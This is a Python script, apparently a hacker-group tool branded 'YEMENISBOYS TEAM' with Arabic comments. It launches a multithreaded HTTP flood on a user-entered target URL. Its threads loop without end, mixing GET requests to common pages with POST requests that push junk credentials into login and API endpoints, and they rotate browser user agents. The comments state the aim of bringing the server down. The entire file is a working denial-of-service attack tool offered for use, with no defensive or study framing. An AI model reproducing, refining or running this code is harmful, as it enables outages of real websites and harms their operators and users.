import threading
import requests
import random
import time
import os
from colorama import Fore, Style, init

init(autoreset=True)

def show_banner():
    os.system('clear')
    print(Fore.RED + Style.BRIGHT + """
    ########################################################
    #                                                      #
    #    ██████╗ ███████╗██████╗ ██╗ ██████╗ ██╗██████╗    #
    #    ██╔══██╗██╔════╝██╔══██╗██║██╔════╝ ██║██╔══██╗   #
    #    ██████╔╝█████╗  ██████╔╝██║██║      ██║██████╔╝   #
    #    ██╔══██╗██╔══╝  ██╔══██╗██║██║      ██║██╔══██╗   #
    #    ██║  ██║███████╗██║  ██║██║╚██████╗ ██║██║  ██║   #
    #    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═╝   #
    #                                                      #
    #          --- HYBRID ATTACK ENGINE ACTIVE ---          #
    #             --- BY YEMENISBOYS TEAM ---               #
    ########################################################
    """)
    print(Fore.RED + "[!] MODE: HYBRID (FLOOD + INJECTION)\n")

# الإعدادات المتقدمة
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

paths_get = ["/", "/about", "/contact", "/search", "/blog"]
paths_post = ["/login", "/signup", "/api/v1/auth", "/api/v1/register", "/api/v1/user"]
payload_data = ["hacker_test", "admin_inject", "yemenisboys_attack", "payload_v1", "chaos_mode"]

stats = {"flood": 0, "injection": 0, "failed": 0}
lock = threading.Lock()

def hybrid_attack_engine(target_base, session):
    global stats
    while True:
        # تحديد نوع الهجوم في كل دورة (50/50)
        attack_type = random.choice(["flood", "injection"])
        
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }

            if attack_type == "flood":
                # الهجوم الأول: GET Flood (لإسقاط السيرفر)
                target_url = target_base + random.choice(paths_get)
                response = session.get(target_url, headers=headers, timeout=3)
                
                with lock:
                    stats["flood"] += 1
                    print(Fore.CYAN + f"[+] FLOOD | Status: {response.status_code} | Path: {target_url}")

            else:
                # الهجوم الثاني: POST Injection (لإغراق الـ API والبيانات)
                target_url = target_base + random.choice(paths_post)
                payload = {
                    "user": random.choice(payload_data),
                    "pass": random.choice(payload_data),
                    "token": random.randint(1000, 9999)
                }
                
                # إرسال طلب POST مع بيانات عشوائية
                response = session.post(target_url, json=payload, headers=headers, timeout=3)
                
                with lock:
                    stats["injection"] += 1
                    print(Fore.MAGENTA + f"[!] INJECTION | Status: {response.status_code} | Path: {target_url}")

        except Exception as e:
            with lock:
                stats["failed"] += 1
            print(Fore.RED + f"[!] ERROR | {str(e)[:15]}")

def start_app():
    show_banner()
    target = input(Fore.RED + "ENTER TARGET URL: " + Fore.WHITE)
    threads_input = input(Fore.RED + "ENTER THREAD INTENSITY: " + Fore.WHITE)
    
    try:
        threads = int(threads_input)
    except:
        threads = 50

    print(Fore.YELLOW + f"\n[!] LAUNCHING HYBRID ATTACK ON: {target}\n")
    time.sleep(2)

    session = requests.Session()

    for i in range(threads):
        t = threading.Thread(target=hybrid_attack_engine, args=(target, session))
        t.daemon = True
        t.start()
        if i % 10 == 0:
            print(Fore.YELLOW + f"[#] DEPLOYING WARRIORS: {i}...")

    try:
        while True:
            time.sleep(2)
            print(Fore.WHITE + f"\n--- [ YEMENISBOYS HYBRID MONITOR ] ---")
            print(Fore.CYAN + f"FLOOD STRIKES (GET):  {stats['flood']}")
            print(Fore.MAGENTA + f"INJECTION STRIKES (POST): {stats['injection']}")
            print(Fore.RED + f"FAILED STRIKES:       {stats['failed']}")
            print(Fore.YELLOW + f"TOTAL STRIKES:        {stats['flood'] + stats['injection'] + stats['failed']}")
            print(Fore.WHITE + "--------------------------------------\n")
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] ATTACK TERMINATED.")

if __name__ == "__main__":
    start_app()